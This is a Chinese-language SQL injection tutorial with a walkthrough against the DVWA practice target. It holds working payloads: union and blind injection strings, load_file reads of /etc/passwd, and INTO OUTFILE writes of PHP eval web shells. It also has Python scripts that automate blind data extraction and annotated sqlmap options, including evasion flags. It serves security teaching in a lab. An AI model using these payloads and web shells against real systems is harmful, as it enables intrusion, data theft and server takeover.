# 1. SQL注入
## 1.1 漏洞简介
>结构化查询语言（Structured Query Language，缩写：SQL），是一种特殊的编程语言，用于数据库中的标准数据查询语言。1986年10月，美国国家标准学会对SQL进行规范后，以此作为关系式数据库管理系统的标准语言（ANSI X3. 135-1986），1987年得到国际标准组织的支持下成为国际标准。不过各种通行的数据库系统在其实践过程中都对SQL规范作了某些编改和扩充。所以，实际上不同数据库系统之间的SQL不能完全相互通用。

## 1.2 漏洞原理
可以通过网站存在的查询语句进行构造，为此开发者对其伤透了脑筋，漏洞不光是查询，可能还存在与API、隐藏链接、http头数据、写入数据等。需要对数据包的结构和传递函数比较了解，建议学习的时候把数据库的日志打开，就可以查看到传递到数据库的语句是什么样子的了。
需要记住的information_schema数据库的SCHEMATA、TABLES、COLUMNS。
SCHEMATA表中存放所有数据库的名，字段名为SCHEMA_NAME。
关键函数database()  当前数据库名、version() 当前mysql版本、user()当前mysql用户.
## 1.3 漏洞危害
危害较高的漏洞,可以获取敏感信息，修改信息，脱裤，上传 webshell,执行命令。
## 2. SQL漏洞类型
### 2.1 区分数字和字符串
数字上是不加单引号的如’2’+‘2’=‘22’而非’4’
而2+2=4

### 2.2 内联SQL注入
sql注入主要是靠内联SQL来进行注入的
and or 与或非的判断来进行内联SQL注入，等于在原先的语句上扩展出来的语句

### 2.3 报错注入
报错注入顾名思义主要是利用数据库报错来进行判断是否存在注入点。如果不符合数据库语法规则就会产生错误。
常用的特殊字符：’ \ ; %00 ) ( # "

### 2.4 盲注
#### 2.4.1 常用函数
1）函数length()
计算数据库长度
```
id=1' and lengh(database())=8;
```
2）函数left(a)=b
sql的left()函数如果式子成立返回1如果不成立返回0
```
select left(database(),1)='r';
```
一般用来猜测库的名字
3）函数substr()
substr()和substring()函数实现的功能是一样的，均为截取字符串。
substring(string, start, length)
substr(string, start, length)
length(可选)要返回的字符数。如果省略，则 mid() 函数返回剩余文本
```
select substr(database(),1,1)='a';
```
可进行单字符验证可进行全字符验证
4）函数mid()
mid(string,start,length)
string(必需)规定要返回其中一部分的字符串。
start(必需)规定开始位置（起始值是 1）。
length(可选)要返回的字符数。如果省略，则 mid() 函数返回剩余文本
```
select mid(database(),1)='testt';
```
可进行单字符验证可进行全字符验证

5）函数ascii()
返回字符串str的最左字符的数值。返回0，如果str为空字符串。返回NULL，如果str为NULL。 ASCII()返回数值是从0到255；
只会返回最左边字符的可以配合substr()

![1559139316203](assets/1559139316203.png)
6）ord函数
ORD() 函数返回字符串第一个字符的 ASCII 值。

![1559139408949](assets/1559139408949.png)

7）函数updatexml()
```
updatexml(XML_document, XPath_string, new_value);
```
第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc
第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。
第三个参数：new_value，String格式，替换查找到的符合条件的数据
在当前数据库中演示

8）函数exp()
exp是以e为底的指数函数。可能会存在溢出
```
mysql> select exp(1);
+-------------------+
| exp(1)            |
+-------------------+
| 2.718281828459045 |
+-------------------+
1 row in set (0.00 sec)
```
由于数字太大是会产生溢出。这个函数会在参数大于709时溢出，报错
```
mysql> select exp(709);
+-----------------------+
| exp(709)              |
+-----------------------+
| 8.218407461554972e307 |
+-----------------------+
1 row in set (0.00 sec)

mysql> select exp(710);
ERROR 1690 (22003): DOUBLE value is out of range in 'exp(710)'
```

### 2.4.2 布尔类型注入
如果成功注入会正确显示内容，如果没成功会显示非正常内容。

### 2.4.3 无报错回显注入
没有任何报错显示，但是能根据页面是否正确显示来进行判断。如搜索注入没有内容，正常搜索应该是有内容的。

### 2.4.4 时间注入
如果exp1为true返回值为sleep，如果为假返回值为1。ps：前提是网络延迟较低的情况。。


```
if(length(database())>1,sleep(5),1)
```


## 2.5 堆叠查询注入
通过分号隔开执行多条语句。
## 2.6 Union注入
前面不存在才会执行后面的语句，一般配合的是布尔类型的盲注

## 2.7 二次注入
在存入数据库的时候做了过滤，但是取出来的时候没有做过滤，而产生的数据库注入。

## 2.8宽字节注入
数据库大多数为GBK才可以%df

## 2.9 cookie注入
cookie中的参数也有可能存在注入

## 2.10 编码注入
Base64

## 2.11 XFF注入攻击
X-Forwarded-for伪造客户端IP

## 2.12 DNS_log
dnslog

## 2.13 组合注入
通过上述所有的注入方式进行组合攻击，如union+盲注

# 3. SQL注入绕过
大小写绕过
pathinfo配合dnslog
原本是id=1
变成1.txt?id=1

# 4. SQL数据库种类

## 4.1 Access
本地访问
## 4.2 MySQL
端口号：3306
需要记住默认库information_schema和其中的表SCHEMATA、TABLES和COLUMNS
SCHEMATA 存储的是用户创建所有数据库的库名记录数据库库名的字段为SCHEMA_NAME，这就是为什么这条数据库语句可以查询到全部数据库的原因
select schema_name from information_schema.schemata 查询全部数据库
select table_schema,table_name from information_schema.tables 查询全部数据库和表的对应
select column_name from information_schema.columns; 查询全部列
select 列 from xxxx库.xxx表; 查询值

limit 后使用 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1) 这种方式触发 sql 注入，受到 Mysql 版本的限制，其区间在 Mysql 5.1.5 - Mysql5.5 附近。

注释符号：--空格，/* */内联注释，# Mysql–后面要加一个空格或者控制字符要不无法注释
‘a’ ‘b’=‘ab’

## 4.3 SQLSever
端口号：1433
注释符号：--，/* */注释
‘a’+‘b’=‘ab’

## 4.4 Oracle
端口号：1521
注释符号：--，/* */注释
‘a’||‘b’=‘ab’

## 4.5 PostgreSQL
端口号：5432或者5433
注释符号：--，/* */注释
‘a’||‘b’=‘ab’

## 4.6 DB2
端口号：5000
SQLite
一种数据库文件，特别小，就一个库多个表，可用sqlite或者sqlite2打开

## 4.7 MongoDB
端口号：27017

# 5. SQL攻击手段
## 5.1 数据库提权
## 5.2 万能密码登陆
ASP站点’or’=‘or’
## 5.3 窃取哈希口令
## 5.4 数据库Dump
## 5.5 读写文件
### 5.5.1 load_file()读取文件操作
前提：
知道文件的绝对路径
能够使用 union 查询
对 web 目录有写的权限
union select 1,load_file('/etc/passwd'),3,4,5#
0x2f6574632f706173737764
union select 1,load_file(0x2f6574632f706173737764),3,4,5#
路径没有加单引号的话必须转换十六进制
要是想省略单引号的话必须转换十六进制
### 5.5.2 into outfile 写入文件操作
前提：
文件名必须是全路径(绝对路径)
用户必须有写文件的权限
没有对单引号'过滤
```
select '<?php phpinfo(); ?>' into outfile 'C:\Windows\tmp\8.php'
select '<?php @eval($_POST["admin"]); ?>' into outfile
'C:\phpStudy\PHPTutorial\WWW\8.php'
```
路径里面两个反斜杠\可以换成一个正斜杠/
PHP 语句没有单引号的话，必须转换成十六进制
要是想省略单引号'的话,必须转换成十六进制
```
<?php eval($_POST["admin"]); ?> 或者 <?php
eval($_GET["admin"]); ?>
<?php @eval($_POST["admin"]); ?>
<?php phpinfo(); ?>
<?php eval($_POST["admin"]); ?>
有时候得写成
<?php eval(\$_POST["admin"]); ?>
```
建议一句话 PHP 语句转换成十六进制
### 5.5.3 数据库备份文件


# 6. 测试方法
## 6.1 手工测试
这里我们采用DVWA靶场进行手工测试。
### 6.1.1 DVWA 简介
DVWA是用PHP+Mysql编写的一套用于常规WEB漏洞教学和检测的WEB脆弱性测试程序。包含了SQL注入、XSS、盲注等常见的一些安全漏洞。
### 6.1.2 DVWA 安装

```
https://github.com/ethicalhack3r/DVWA/archive/master.zip
```
本地PHPStudy搭建DVWA靶机，放入www目录下即可
环境使用PHP+MySQL即可。
### 6.1.3 测试过程
#### 6.1.3.4 Low
（1）SQL Injection
其他难度主要是为绕过手段。

![1559636715555](assets/1559636715555.png)

判断是否存在注入在这里使用一个分号来进行扰乱数据库

![1559636832655](assets/1559636832655.png)

查看数据库，发现命令没有生效

![1559636866770](assets/1559636866770.png)

使用%23来把后面的内个分号进行注释，这里不能使用#因为#为php的锚点不会传递到服务器。可以正常查询

![1559636933108](assets/1559636933108.png)

数据库中发现#把后面的引号注释掉了导致语句成功执行

![1559636970503](assets/1559636970503.png)

利用这个特性来进行注入构造语句```id=1'or 1=1%23```因为后面1=1为真就会把全部的字段全部输出出来。

![1559637024621](assets/1559637024621.png)

改一下代码显示sql语句。

```/var/www/html/www1/vulnerabilities/sqli/source```在这个文件下有源码在+一条```echo $query```![1559638360170](assets/1559638360170.png)

（2）堆叠注入

![1559638482214](assets/1559638482214.png)

不知道为何会报错把这条语句复制下来在mysql命令行输入没有报错正常显示

![1559640619722](assets/1559640619722.png)
（3）union注入

第一步先进行字段数量判断```order by xx```

![1559640910854](assets/1559640910854.png)

```order by 3```的时候出现了报错说明为2个字段代码中也能体现，但是如果是渗透测试是看不见数据库命令的只能通过这个去尝试

![1559640986613](assets/1559640986613.png)

得出2个字段后进行union注入```id=1'union+select+1,2%23```

![1559641067490](assets/1559641067490.png)

1和2都显示了说明都可以进行替换。

![1559641595196](assets/1559641595196.png)

```?id=1'union+select+table_schema,table_name from information_schema.tables%23```把所有数据库的库和表都对应的显示出来了。寻找需要的表

![1559642200199](assets/1559642200199.png)

![1559642236485](assets/1559642236485.png)

再去查字段```?id=1'union+select+column_name,2 from information_schema.columns%23```到最后找到属于users表的字段

first_name,password再去构造查询语句



![1559642392277](assets/1559642392277.png)

```?id=1'union+select+first_name,password from dvwa.users```查询到要拿到的内容了想想有没有简单的方法。

![1559642467988](assets/1559642467988.png)

直接去查询他的表对应的字段就简单了

```?id=1'union+select+table_name,column_name from information_schema.columns%23```

所以只需要记住information_schema库下的columns表中的字段就可以了库是table_schema,表是table_name,字段是column_name

![1559642699678](assets/1559642699678.png)
（4）SQL Injection(Bind)

盲注即为不回显内容需要进行尝试根据页面返回的内容是否正常来进行判断

![1559643423663](assets/1559643423663.png)

![1559643479549](assets/1559643479549.png)

说明存在盲注

![1559643490081](assets/1559643490081.png)

（5）内联注入

直接用内联注入简单快捷。。

用```length(database())=xx```来判断数据库名长度如果成立就会返回正常

![1559643740924](assets/1559643740924.png)

说明数据库名为4位

![1559643802791](assets/1559643802791.png)

```1' and mid(database(),1,1)<'g'#```使用mid来判断数据库第一位的内容只需要修改第二个标志位来判断位数如果为正确就会返回存在ID

![1559643914467](assets/1559643914467.png)

```1' and mid(database(),2,1)='v'#```

![1559643934863](assets/1559643934863.png)

后面就省略了。之后会有脚本教学进行判断


``````
1' and (select count(table_name) from information_schema.tables where table_schema=database())=1# 显示不存在
1' and (select count(table_name) from information_schema.tables where table_schema=database())=2# 显示存在说明当前数据库存在两个表
``````

``````
1' and length(mid((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9# 显示存在说明第一个表名字长度为9
``````

``````
1' and mid((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)='g'# 显示存在说明第一个表的第一个字为g
``````

``````
1' and mid((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1)='u'# 显示存在说明users表的第一个字段为u
``````

``````
1' and mid((select first_name from dvwa.users limit 0,1),1,1)='a'#  显示存在说明first_name的字段，第一个的数据为a
``````

时间盲注加个sleep就可以了

``````
1' and if(length(database())=1,sleep(5),1) # 没有延迟

1' and if(length(database())=2,sleep(5),1) # 没有延迟

1' and if(length(database())=3,sleep(5),1) # 没有延迟

1' and if(length(database())=4,sleep(5),1) # 明显延迟
``````

#### 6.1.3.2 Medium

（1）SQL Injection

只做绕过不进行详细测试。

发现只是改成了POST型，加了个过滤特殊符号的函数，改成了数字型注入。

![1559645820681](assets/1559645820681.png)

成功注入

![1559645879894](assets/1559645879894.png)

![1559645892314](assets/1559645892314.png)
#### SQL Injection(Bind)

一样就是改成了POST和过滤，数字型盲注。

![1559645982680](assets/1559645982680.png)

正常绕过了

![1559646084089](assets/1559646084089.png)

#### 6.1.3.3 High
（1）SQL Injection

通过外部传递进来的session的id和限制一次只能显示一行

![1559646224652](assets/1559646224652.png)

绕过了limit的限制

![1559646496924](assets/1559646496924.png)

成功注入

![1559646555701](assets/1559646555701.png)

需要特别提到的是，High级别的查询提交页面与查询结果显示页面不是同一个，也没有执行302跳转，这样做的目的是为了防止一般的sqlmap注入，因为sqlmap在注入过程中，无法在查询提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入。

#### SQL Injection(Bind)

跟上面差不多这个是Cookie的传递id，limit也是限制显示一行

![1559646600971](assets/1559646600971.png)

这个比显示注入简单些，直接能在cookie处修改注入![1559646793335](assets/1559646793335.png)

成功绕过

![1559646872678](assets/1559646872678.png)

#### 6.1.3.4 Impossible

（1）SQL Injection

做了个CSRF的防御，使用了PDO进行了分离数据和参数

先判断了一下id是否为数字如果不为数字直接就会跳过数据库查询，bindParam把id转换为int型,防止输入的数字为字符。进行查询有效限制了恶意构造语句

![1559647652359](assets/1559647652359.png)

（2）SQL Injection(Bind)

跟如上一样

![1559647836899](assets/1559647836899.png)

## 6.2 工具测试
继续对DVWA靶场进行测试。

### 6.2.1 Python半自动化脚本

多用于盲注，这里只演示盲注

#### 6.2.1.1 注入数据库名

```python
"""
@Product:DVWA 
@Author:Aixic
@create：2019-06-04-19:33
"""
import urllib.request

header={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36'
    ,'Cookie':'PHPSESSID=248dmjg65dksvfvf8kk0k7vqj0; security=low'}
payload="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_{}"
url="http://192.168.123.20/vulnerabilities/sqli_blind/?id=1"
end="&Submit=Submit#"
#1%27+and+mid%28database%28%29%2C1%2C1%29%3D%27d%27%23
if __name__ == '__main__':
    a=""
    for i in range(1,20):
        for j in payload:
            url1="%27+and+mid%28database%28%29%2C"+str(i)+"%2C1%29%3D%27"+str(j)+"%27%23"
            url_code_name = urllib.parse.quote(url1)
            #print(url1)
            try:
                rp = urllib.request.Request(url + url1 + end, headers=header)
                respon = urllib.request.urlopen(rp)
                html = respon.read().decode('utf-8')
                if "User ID exists in the database." in html:
                    a+=j
                    print(a)
                    break
            except:
                continue
```

#### 6.2.1.2 查询数据库名

```python
"""
@Product:DVWA 
@Author:Aixic
@create：2019-06-04-19:33
"""
import urllib.request

header={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36'
    ,'Cookie':'PHPSESSID=248dmjg65dksvfvf8kk0k7vqj0; security=low'}
payload="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_{}"
urlhead="http://192.168.123.20/vulnerabilities/sqli_blind/?id=1"
end="&Submit=Submit#"
#1%27+and+mid%28database%28%29%2C1%2C1%29%3D%27d%27%23
if __name__ == '__main__':
    a=""
    c = 0
    for k in range(0,20):
        a+="\r\n"+str(k)+":"
        if c==2:
            print("结束了")
            exit()
        for i in range(1,20):
            for j in payload:
                #url="%27+and+mid%28database%28%29%2C"+str(i)+"%2C1%29%3D%27"+str(j)+"%27%23"
                url="%27+and+mid%28%28select+schema_name+from+information_schema.schemata+limit+"+str(k)+"%2C1%29%2C"+str(i)+"%2C1%29%3D%27"+str(j)+"%27%23"
                #' and mid((select schema_name from information_schema.schemata limit 0,1),1,1)='i'#
                try:
                    rp = urllib.request.Request(urlhead + url + end, headers=header)
                    respon = urllib.request.urlopen(rp)
                    html = respon.read().decode('utf-8')
                    if "User ID exists in the database." in html:
                        a+=j
                        print(a)
                        c = 0
                        break
                except:
                    continue
        c += 1
```

![1559652375713](assets/1559652375713.png)

#### 6.2.1.3 查询数据库的全部表

```python
import urllib.request

header={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36'
    ,'Cookie':'PHPSESSID=248dmjg65dksvfvf8kk0k7vqj0; security=low'}
payload="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_{}"
urlhead="http://192.168.123.20/vulnerabilities/sqli_blind/?id=1"
end="&Submit=Submit#"
#1%27+and+mid%28database%28%29%2C1%2C1%29%3D%27d%27%23
if __name__ == '__main__':
    a=""
    c = 0
    for k in range(0,20):
        a+="\r\n"+str(k)+":"
        if c==2:
            print("结束了")
            exit()
        for i in range(1,20):
            for j in payload:
                #url="%27+and+mid%28database%28%29%2C"+str(i)+"%2C1%29%3D%27"+str(j)+"%27%23"
                #url="%27+and+mid%28%28select+schema_name+from+information_schema.schemata+limit+"+str(k)+"%2C1%29%2C"+str(i)+"%2C1%29%3D%27"+str(j)+"%27%23"
                url="%27+and+mid%28%28select+table_name+from+information_schema.tables+where+table_schema%3Ddatabase%28%29+limit+"+str(k)+"%2C1%29%2C"+str(i)+"%2C1%29%3D%27"+str(j)+"%27%23"
                #' and mid((select schema_name from information_schema.schemata limit 0,1),1,1)='i'#
                try:
                    rp = urllib.request.Request(urlhead + url + end, headers=header)
                    respon = urllib.request.urlopen(rp)
                    html = respon.read().decode('utf-8')
                    if "User ID exists in the database." in html:
                        a+=j
                        print(a)
                        c = 0
                        break
                except:
                    continue
        c += 1
```

![1559652578654](assets/1559652578654.png)

#### 6.2.1.4 查询数据库的表的全部字段

```python
"""
@Product:DVWA 
@Author:Aixic
@create：2019-06-04-19:33
"""
import urllib.request

header={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36'
    ,'Cookie':'PHPSESSID=248dmjg65dksvfvf8kk0k7vqj0; security=low'}
payload="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_{}"
urlhead="http://192.168.123.20/vulnerabilities/sqli_blind/?id=1"
end="&Submit=Submit#"
#1%27+and+mid%28database%28%29%2C1%2C1%29%3D%27d%27%23
if __name__ == '__main__':
    a=""
    c = 0
    for k in range(0,20):
        a+="\r\n"+str(k)+":"
        if c==2:
            print("结束了")
            exit()
        for i in range(1,20):
            for j in payload:
                #url="%27+and+mid%28database%28%29%2C"+str(i)+"%2C1%29%3D%27"+str(j)+"%27%23"
                #url="%27+and+mid%28%28select+schema_name+from+information_schema.schemata+limit+"+str(k)+"%2C1%29%2C"+str(i)+"%2C1%29%3D%27"+str(j)+"%27%23"
                #url="%27+and+mid%28%28select+table_name+from+information_schema.tables+where+table_schema%3Ddatabase%28%29+limit+"+str(k)+"%2C1%29%2C"+str(i)+"%2C1%29%3D%27"+str(j)+"%27%23"
                url="%27+and+mid%28%28select+column_name+from+information_schema.columns+where+table_name%3D%27users%27+limit+"+str(k)+"%2C1%29%2C"+str(i)+"%2C1%29%3D%27"+str(j)+"%27%23"
                #' and mid((select schema_name from information_schema.schemata limit 0,1),1,1)='i'#
                try:
                    rp = urllib.request.Request(urlhead + url + end, headers=header)
                    respon = urllib.request.urlopen(rp)
                    html = respon.read().decode('utf-8')
                    if "User ID exists in the database." in html:
                        a+=j
                        print(a)
                        c = 0
                        break
                except:
                    continue
        c += 1
```

![1559652774534](assets/1559652774534.png)

#### 6.2.1.5 查询字段数据

```python
"""
@Product:DVWA 
@Author:Aixic
@create：2019-06-04-19:33
"""
import urllib.request

header={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36'
    ,'Cookie':'PHPSESSID=248dmjg65dksvfvf8kk0k7vqj0; security=low'}
payload="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_{}"
urlhead="http://192.168.123.20/vulnerabilities/sqli_blind/?id=1"
end="&Submit=Submit#"
#1%27+and+mid%28database%28%29%2C1%2C1%29%3D%27d%27%23
if __name__ == '__main__':
    a=""
    c = 0
    for k in range(0,20):
        a+="\r\n"+str(k)+":"
        if c==2:
            print("结束了")
            exit()
        for i in range(1,20):
            for j in payload:
                #url="%27+and+mid%28database%28%29%2C"+str(i)+"%2C1%29%3D%27"+str(j)+"%27%23"
                #url="%27+and+mid%28%28select+schema_name+from+information_schema.schemata+limit+"+str(k)+"%2C1%29%2C"+str(i)+"%2C1%29%3D%27"+str(j)+"%27%23"
                #url="%27+and+mid%28%28select+table_name+from+information_schema.tables+where+table_schema%3Ddatabase%28%29+limit+"+str(k)+"%2C1%29%2C"+str(i)+"%2C1%29%3D%27"+str(j)+"%27%23"
                #url="%27+and+mid%28%28select+column_name+from+information_schema.columns+where+table_name%3D%27users%27+limit+"+str(k)+"%2C1%29%2C"+str(i)+"%2C1%29%3D%27"+str(j)+"%27%23"
                url="%27+and+mid%28%28select+first_name+from+dvwa.users+limit+"+str(k)+"%2C1%29%2C"+str(i)+"%2C1%29%3D%27"+str(j)+"%27%23"
                #' and mid((select schema_name from information_schema.schemata limit 0,1),1,1)='i'#
                try:
                    rp = urllib.request.Request(urlhead + url + end, headers=header)
                    respon = urllib.request.urlopen(rp)
                    html = respon.read().decode('utf-8')
                    if "User ID exists in the database." in html:
                        a+=j
                        print(a)
                        c = 0
                        break
                except:
                    continue
        c += 1
```

![1559652926870](assets/1559652926870.png)

### 6.2.2 SQLMAP

#### 6.2.2.1 SQLMAP参数
（1）Options
```
-h, --help 查看帮助，没什么好说的
-hh 查看全部的帮助
--version 查看版本
-v 显示信息的级别，一共有六级：0：只显示python 错误和一些严重信息；1：显示基本信息（默认）；2：显示debug信息；3：显示注入过程的payload；4：显示http请求包；5：显示http响应头；7：显示http相应页面。
```
（2）Target
```
-d 直接连目标后端接数据库，而不是使用sql注入漏洞，直接通过目标的侦听端口连接，当然需要有目标数据库的账号名和密码。例：-d "mysql://user:password@192.168.75.128:3389/databasename" --dbs 查询非常快。
-u 指定一个url连接，url中必须有？xx=xx 才行（最常用的参数）例：-u "www.abc.com/index.php?id=1"
-l 后接一个log文件，可以是burp等的代理的log文件，之后sqlmap会扫描log中的所有记录。例： -l log.txt
-x 站点地图，提交给sql一个xml文件。
-m 后接一个txt文件，文件中是多个url，sqlmap会自动化的检测其中的所有url。例： -m target.txt
-r 可以将一个post请求方式的数据包保存在一个txt中，sqlmap会通过post方式检测目标。例： -r post.txt
-g 使用google引擎搜索类似的网址，并且多目标检测。例： -g "inurl:\".php?id=1\"" \是转义
-c 将使用的命令写在一个文件中，让sqlmap执行文件中的命令，我们可以用--save命令将配置写入文件。
```
（3）Request
```
--method=METHOD 指定是get方法还是post方法。例： --method=GET --method=POST
--data=DATA 指明参数是哪些。例：-u "www.abc.com/index.php?id=1" --data="name=1&pass=2"
--param-del=PARA. 指明使用的变量分割符。例： -u "www.abc.com/index.php?id=1" --data="name=1;pass=2" --param-del=";"
--cookie=COOKIE 指定测试时使用的cookie，通常在一些需要登录的站点会使用。例： -u "www.abc.com/index.php?id=1" --cookie="a=1;b=2"
--cookie-del=COO.. 和前面的 --param-del=PARA. 类似，就是指明分割cookie的字符。
--load-cookies=L.. 从包含Netscape / wget格式的cookie的文件中加载cookie。
--drop-set-cookie 默认情况下，sqlmap是开启set-cookie功能的，也就是当收到一个含有set-cookie的http包的时候，下次sql会使用新的cookie进行发包，如果使用这条命令，就会关闭这个功能。在level>=2时会检测cookie注入。
--user-agent=AGENT 指定一个user-agent的值进行测试。例： --user-agent="aaaaaaa" 默认情况下，sqlmap会使用自己的user-agent进行测试（所以很多服务器发现user-agent是sqlmap的数据包直接认为是入侵），sqlmap自己的user-agent是：sqlmap/1.0-dev-nongit-201603020a89(http://sqlmap.org)
--random-agent 使用随机user-agent进行测试。sqlmap有一个文件中储存了各种各样的user-agent，文件在sqlmap/txt/user-agent.txt 在level>=3时会检测user-agent注入。
--host=HOST 指定http包中的host头参数。例： --host="aaaaaa" 在level>=5时才会检查host头注入。\n是换行
--referer=REFERER 指定http包中的refere字段。例： --refere="aaaaa" 在level>=3时才会检测refere注入。
-H --headers 额外的header头，每个占一行。例：--headers="host:www.a.com\nUser-Agent:yuangh"
--headers=HEADERS 跟上边一样，再举一个例子： --headers="Accept-Language: fr\nETag: 123" 注意所有构造http包的部分均区分大小写
--auth-type=AUTH.. 基于http身份验证的种类。例： --auth-type Basic/Digest/NTLM 一共有三种认证方式。
--auth-cred=AUTH.. 使用的认证，例： --auth-type Basic --auth-cred "user:password"
--auth-file=AUTH.. 使用.PEM文件中的认证。例：--auth-file="AU.PEM" 少见。
--ignore-code=IG.. 无视http状态码。例： --ignore-code=401
--ignore-proxy 无视本地的代理，有时候机器会有最基本的代理配置，在扫描本地网段的时候会很麻烦，使用这个参数可以忽略代理设置。
--ignore-redirects 无视http重定向，比如登录成功会跳转到其他网页，可使用这个忽略掉。
--ignore-timeouts 忽略连接超时。
--proxy=PROXY 指定一个代理。例： --proxy="127.0.0.1:8087" 使用GoAgent代理。
--proxy-cred=PRO.. 代理需要的认证。例： --proxy="name:password"
--proxy-file=PRO.. 从一个文件加载代理的认证。
--tor 使用tor匿名网络，不懂。
--tor-port=TORPORT 设置默认的tor代理端口，不懂+2。
--tor-type=TORTYPE 设置tor代理种类，(HTTP, SOCKS4 or SOCKS5 (默认))，不懂+3。
--check-tor 检查是否正确使用Tor，不懂+4。
--delay=DELAY 每次发包的延迟时间，单位为秒，浮点数。例：--delay 2.5 有时候频繁的发包会引起服务器注意，需要使用delay降低发包频率。
--timeout=TIMEOUT 请求超时的时间，单位为秒，浮点数，默认30s。
--retries=RETRIES 超时重连次数，默认三次。例： --retries=5
--randomize=RPARAM 参数的长度，类型与输入值保持一致的前提下，每次请求换参数的值。有时候反复的提交同一个参数会引起服务器注意。
--safe-url=SAFEURL 用法和-u类似，就是一个加载测试url的方法，但额外功能是防止有时候时间长了不通讯服务器会销毁session，开启这种功能会隔一段时间发一个包保持session。
--safe-post=SAFE.. 和上面的一样，只是使用post的方式发送数据。
--safe-req=SAFER.. 和上面的一样，只是从一个文件获得目标。
--safe-freq=SAFE.. 频繁的发送错误的请求，服务器也会销毁session或者其他惩罚方式，开启这个功能之后，发几次错的就会发一次对的。通常用于盲注。
--skip-urlencode 跳过url编码，毕竟不排除有的奇葩网站url不遵守RFC标准编码。
--csrf-token=CSR.. 保持csrf令牌的token。
--csrf-url=CSRFURL 访问url地址获取csrf的token。
--force-ssl 强制使用ssl。
--hpp 使用http参数污染，通常http传递参数会以名称-值对的形势出现，通常在一个请求中，同样名称的参数只会出现一次。但是在HTTP协议中是允许同样名称的参数出现多次的，就可能造成参数篡改。
--eval=EVALCODE 执行一段指定的python代码。例： -u "www.abc.com/index.php?id=1" --eval="import hashlib;hash=hashlib.md5(id).hexdigest()"
```
（4）Optimization
```
-o 开启下面三项（--predict-output，--keep-alive， --null-connection）
--predict-output 预设的输出，可以理解为猜一个表存在不存在，根据服务器返回值来进行判断，有点类似暴力破解，但和暴力破解又不同，这个是一个范围性的暴力破解，一次一次的缩小范围。
--keep-alive 使用http（s）长链接，性能更好，避免重复建立链接的开销，但占用服务器资源，而且与--proxy不兼容。
--null-connection 只看页面返回的大小值，而不看具体内容，通常用于盲注或者布尔的判断，只看对错，不看内容。
--threads=THREADS 开启多线程，默认为1，最大10。和 --predict-output 不兼容。
Injection
-p TESTPARAMETER 知道测试的参数，使用这个的话--level 参数就会失效。例： -p "user-agent,refere"
--skip=SKIP 排除指定的参数。例： --level 5 --skip="id,user-agent"
--skip-static 跳过测试静态的参数。
--param-exclude=.. 使用正则表达式跳过测试参数。
--dbms=DBMS 指定目标数据库类型。例： --dbms="MySQL<5.0>" Oracle<11i> Microsoft SQL Server<2005>
--dbms-cred=DBMS.. 数据库的认证。利： --dbms-cred="name:password"
--os=OS 指定目标操作系统。例： --os="Linux/Windows"
--invalid-bignum 通常情况下sqlmap使用负值使参数失效，比如id=1->id=-1,开启这个之后使用大值使参数失效，如id=9999999999。
--invalid-logical 使用逻辑使参数失效，如id=1 and 1=2。
--invalid-string 使用随机字符串使参数失效。
--no-cast 获取数据时，sqlmap会将所有数据转换成字符串，并用空格代替null。
--no-escape 用于混淆和避免出错，使用单引号的字符串的时候，有时候会被拦截，sqlmap使用char()编码。例如：select “a”-> select char(97)。
--prefix=PREFIX 指定payload前缀，有时候我们猜到了服务端代码的闭合情况，需要使用这个来指定一下。例： -u "www.abc.com/index?id=1" -p id --prefix")" --suffix "and ('abc'='abc"
--suffix=SUFFIX 指定后缀，例子同上。
--tamper=TAMPER 使用sqlmap自带的tamper，或者自己写的tamper，来混淆payload，通常用来绕过waf和ips。
```
（5）Detection
```
--level=LEVEL 设置测试的等级（1-5，默认为1）lv2：cookie; lv3：user-agent，refere; lv5：host 在sqlmap/xml/payloads文件内可以看见各个level发送的payload
--risk=RISK 风险（1-4，默认1）升高风险等级会增加数据被篡改的风险。risk 2：基于事件的测试;risk 3：or语句的测试;risk 4：update的测试
--string=STRING 在基于布尔的注入时，有的时候返回的页面一次一个样，需要我们自己判断出标志着返回正确页面的标志，会根据页面的返回内容这个标志（字符串）判断真假，可以使用这个参数来制定看见什么字符串就是真。
--not-string=NOT.. 同理，这个参数代表看不见什么才是真。
--regexp=REGEXP 通常和上面两种连用，使用正则表达式来判断。
--code=CODE 也是在基于布尔的注入时，只不过指定的是http返回码。
--text-only 同上，只不过指定的是页面里的一段文本内容。
--titles 同上，只不过指定的是页面的标题。
```
（6）Techniques
```
--technique=TECH 指定所使用的技术（B:布尔盲注;E:报错注入;U:联合查询注入;S:文件系统，操作系统，注册表相关注入;T:时间盲注; 默认全部使用）
--time-sec=TIMESEC 在基于时间的盲注的时候，指定判断的时间，单位秒，默认5秒。
--union-cols=UCOLS 联合查询的尝试列数，随level增加，最多支持50列。例： --union-cols 6-9
--union-char=UCHAR 联合查询默认使用的占列的是null，有些情况null可能会失效，可以手动指定其他的。例： --union-char 1
--union-from=UFROM 联合查询从之前的查询结果中选择列，和上面的类似。
